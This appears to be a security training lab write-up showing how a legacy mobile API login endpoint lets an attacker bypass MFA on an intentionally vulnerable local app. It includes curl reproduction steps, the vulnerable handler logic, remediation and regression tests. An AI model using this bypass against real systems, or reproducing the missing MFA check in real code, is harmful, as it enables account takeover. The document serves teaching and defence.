# Lab 6 — MFA Bypass via Legacy API

## 1. Objective

Demonstrate how maintaining legacy authentication endpoints without secondary authentication checks allows bypassing multi-factor authentication (MFA) requirements on MFA-enforced accounts.

## 2. Scenario

An organization transitioned its authentication workflow to require MFA for protected user accounts. The primary web login route requires a one-time passcode for users with `mfa_enabled = 1`. However, a legacy mobile API login endpoint (`/auth-01/api/v1/login`) remains accessible and does not enforce the second factor.

**Trust boundary:** The application assumed that clients would only use the modern authentication interface.

## 3. Preconditions

| Item | Value |
|------|-------|
| Target account | `grace` / `grace123` |
| Account configuration | `mfa_enabled = 1` |
| Seed state | Initial database seed (`POST /reset`) |

The primary login endpoint blocks login attempts for Grace when an MFA code is omitted.

## 4. Vulnerability Mechanism

The modern login endpoint verifies MFA:

```python
if user['mfa_enabled']:
    if mfa_code != '123456':
        return jsonify({'error': 'MFA required'}), 403
```

The legacy endpoint verifies only username and password, then directly generates a session token without evaluating `user['mfa_enabled']`.

## 5. Reproduction

1. Attempt primary login without MFA (returns HTTP 403):

```bash
curl -X POST http://localhost:5000/lab/auth/auth-01/login \
  -H "Content-Type: application/json" \
  -d '{"username": "grace", "password": "grace123"}'
```

2. Authenticate via the legacy API endpoint:

```bash
curl -X POST http://localhost:5000/lab/auth/auth-01/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username": "grace", "password": "grace123"}'
```

3. Extract the returned bearer token and access Grace's profile:

```bash
curl http://localhost:5000/lab/auth/auth-01/profile \
  -H "Authorization: Bearer <TOKEN>"
```

## 6. Evidence

The legacy endpoint returns an active session token:

```json
{
  "role": "user",
  "token": "dGhpcy1pcy1hLXRva2Vu...",
  "username": "grace"
}
```

The profile endpoint confirms authorized access using the generated token.

## 7. Root Cause

**File:** `app/routes/auth_labs.py`  
**Function:** `lab06_legacy_login()`

In vulnerable mode, the handler omits MFA checks:

```python
if patched:
    if user['mfa_enabled']:
        return jsonify({'error': 'MFA verification required', 'mfa_required': True}), 403
```

## 8. Impact

An attacker possessing compromised primary credentials can completely circumvent multi-factor authentication defenses, rendering MFA controls ineffective.

## 9. Remediation

Apply unified authentication policies across all API versions and endpoints, or deprecate and decommission unmaintained legacy endpoints:

```python
if user['mfa_enabled']:
    return jsonify({'error': 'MFA verification required', 'mfa_required': True}), 403
```

## 10. Regression Validation

**Test:** `tests/test_lab_06.py`

- **Vulnerable mode:** Legacy login for Grace without MFA → HTTP 200 with valid session token.
- **Patched mode:** Legacy login for Grace without MFA → HTTP 403 with `mfa_required: true`.
- **Legitimate flow:** Primary login with valid MFA code → HTTP 200.

## 11. Research Discussion

1. Why do legacy API versions frequently remain active and unpatched in production microservice architectures?
2. How can API gateway policies enforce centralized authentication invariants across all downstream services?
3. What strategies can security teams implement to discover forgotten or shadow API routes?
